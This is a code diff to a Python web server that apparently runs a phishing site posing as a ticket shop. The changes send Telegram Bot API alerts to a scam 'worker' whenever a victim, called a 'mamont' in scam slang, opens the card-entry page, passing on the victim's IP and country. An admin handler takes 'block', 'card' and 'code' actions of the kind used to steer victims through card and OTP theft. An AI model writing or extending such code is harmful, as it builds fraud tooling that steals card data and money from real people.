@@ -958,25 +958,25 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             page_name_for_log = get_page_name(norm_path)
             send_personal_log_to_admin(page_code, ip, country, page_name_for_log)
             
-            # Спеціальне логування для event creator на сторінці введення карти
-            if '/buy-tickets/loading/' in norm_path:
-                # Логуємо з російською назвою "Ввод карты"
-                send_telegram_log_async(
-                    page="Ввод карты",
-                    link=self.path,
-                    ip=ip,
-                    country=country,
-                    extra_user_id=extra_user_id
+            # Логуємо ТІЛЬКИ для event creator на сторінці введення карти
+            if '/buy-tickets/loading/' in norm_path and extra_user_id:
+                # Логуємо з російською назвою "Ввод карты" в потрібному форматі
+                message = (
+                    f"🔔Мамонт открыл страницу\n\n"
+                    f"📎Страница: Ввод карты\n"
+                    f"#️⃣Ссылка: ?page={page_code}\n"
+                    f"📶IP: {ip}\n"
+                    f"🌎Страна: {country}"
                 )
-            else:
-                # Звичайний лог для інших сторінок
-                send_telegram_log_async(
-                    page=norm_path,
-                    link=self.path,
-                    ip=ip,
-                    country=country,
-                    extra_user_id=extra_user_id
-                )
+                
+                # Надсилаємо event creator
+                try:
+                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                    data = {"chat_id": extra_user_id, "text": message}
+                    requests.post(url, data=data, timeout=1)
+                    print(f"📤 Лог надіслано event creator {extra_user_id}")
+                except Exception as e:
+                    print(f"❌ Помилка надсилання event creator: {e}")
         elif is_telegram:
             pass  # Не логуємо Telegram запити
         elif extra_user_id and not should_log:
@@ -986,46 +986,8 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         else:
             pass  # Не логуємо зайві повідомлення
         
-        # Група та адмін — логуємо тільки реальні сторінки та не Telegram, АЛЕ НЕ якщо це вже залоговано для event creator
-        if should_log and not should_ignore_first_visit and not is_telegram and not extra_user_id:
-            print(f"[DEBUG] Логуємо в групу: should_log={should_log}, should_ignore_first_visit={should_ignore_first_visit}, is_telegram={is_telegram}, extra_user_id={extra_user_id}")
-            if not hasattr(self.server, 'logged_paths'):
-                self.server.logged_paths = set()
-            if norm_path not in self.server.logged_paths:
-                self.server.logged_paths.add(norm_path)
-                # Отримуємо країну за IP
-                country = get_country_by_ip(ip)
-                print(f"[DEBUG] Надсилаємо лог в групу: {norm_path}, IP: {ip}, країна: {country}")
-                
-                # Спеціальне логування для сторінки введення карти
-                if '/buy-tickets/loading/' in norm_path:
-                    # Логуємо кожен раз, коли користувач заходить на сторінку введення карти
-                    send_telegram_log_async(
-                        page="Ввод карты",
-                        link=self.path,
-                        ip=ip,
-                        country=country,
-                        important=True
-                    )
-                else:
-                    # Non-blocking log - тільки важливі повідомлення для інших сторінок
-                    send_telegram_log_async(
-                        page=norm_path,
-                        link=self.path,
-                        ip=ip,
-                        country=country,
-                        important=True  # Тільки важливі повідомлення
-                    )
-            # else:
-            #     pass  # Не логуємо повторно
-        elif is_telegram:
-            pass  # Не логуємо Telegram запити
-        elif should_ignore_first_visit:
-            pass  # Не логуємо перший перехід
-        elif not should_log:
-            pass  # Не логуємо не-сторінки
-        elif extra_user_id:
-            pass  # Не логуємо в групу - вже залоговано для event creator
+        # НЕ логуємо в групу - тільки для event creator на сторінці введення карти
+        pass
         
         # Якщо це перший перехід на нову сторінку, видаляємо page_code зі списку ігнорування
         if should_ignore_first_visit:
@@ -1365,8 +1327,7 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 page = data.get('page', '')
                 link = data.get('link', '')
                 ip = get_real_ip(self)
-                # Non-blocking log
-                send_telegram_log_async(page=page, link=link, ip=ip)
+                # НЕ логуємо - тільки для event creator на сторінці введення карти
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b'OK')
@@ -1525,10 +1486,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 data = json.loads(post_data)
                 action = data.get('action')
                 ip = data.get('ip')
-                # --- Тільки тут надсилаємо в обидві групи ---
+                # --- Обробляємо адмін дії ---
                 if action in ['block', 'card', 'code'] and ip:
-                    # Non-blocking important log
-                    send_telegram_log_async(page=action, link='', ip=ip, important=True)
+                    # НЕ логуємо - тільки для event creator на сторінці введення карти
+                    pass
                 if action == 'block' and ip:
                     BLACKLISTED_IPS.add(ip)
                     print(f'[admin_action] Blocked IP: {ip}')
